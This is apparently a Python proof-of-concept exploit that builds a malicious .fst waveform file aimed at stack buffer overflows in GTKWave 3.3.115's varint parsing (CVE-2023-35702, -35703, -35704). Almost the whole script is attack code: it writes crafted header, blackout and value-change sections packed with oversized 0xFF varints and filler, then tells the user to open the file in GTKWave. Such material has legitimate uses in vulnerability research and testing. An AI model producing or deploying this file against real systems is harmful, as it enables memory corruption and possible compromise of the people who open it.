#!/usr/bin/env python3

# GTKWave FST LEB128 varint stack-based buffer overflow PoC
# Creates a malicious .fst file triggering CVE-2023-35702, CVE-2023-35703, CVE-2023-35704

import struct

def create_malicious_fst(filename):
    with open(filename, 'wb') as f:
        # FST_BL_HDR section (0x00)
        f.write(b'\x00')  # sectype
        f.write(struct.pack('>Q', 0x30))  # seclen
        
        # Header content
        f.write(struct.pack('>Q', 1))  # start_time (non-zero to avoid hdr_incomplete)
        f.write(struct.pack('>Q', 1))  # end_time
        f.write(struct.pack('>Q', 0))  # mem_used_by_writer
        f.write(struct.pack('>Q', 0))  # scope_count
        f.write(struct.pack('>Q', 0))  # var_count
        
        # FST_BL_BLACKOUT section (0x02) to trigger CVE-2023-35702 and CVE-2023-35703
        f.write(b'\x02')  # sectype
        f.write(struct.pack('>Q', 0x100))  # seclen (large enough)
        
        # Malicious num_blackouts (CVE-2023-35702)
        # Send 10 bytes of 0xFF to overflow the 5-byte buffer in fstReaderVarint32
        f.write(b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF')
        
        # Fill the rest with garbage
        f.write(b'A' * (0x100 - 10))
        
        # FST_BL_VCDATA section (0x0E) to trigger CVE-2023-35704
        f.write(b'\x0E')  # sectype
        f.write(struct.pack('>Q', 0x100))  # seclen
        
        # Malicious varint (CVE-2023-35704)
        # Send 10 bytes of 0xFF to overflow the 5-byte buffer in fstReaderVarint32WithSkip
        f.write(b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF')
        
        # Fill the rest with garbage
        f.write(b'B' * (0x100 - 10))

if __name__ == '__main__':
    print("[*] Creating malicious FST file...")
    create_malicious_fst("exploit.fst")
    print("[+] Malicious FST file created as 'exploit.fst'")
    print("[*] Open this file with GTKWave 3.3.115 to trigger the vulnerabilities")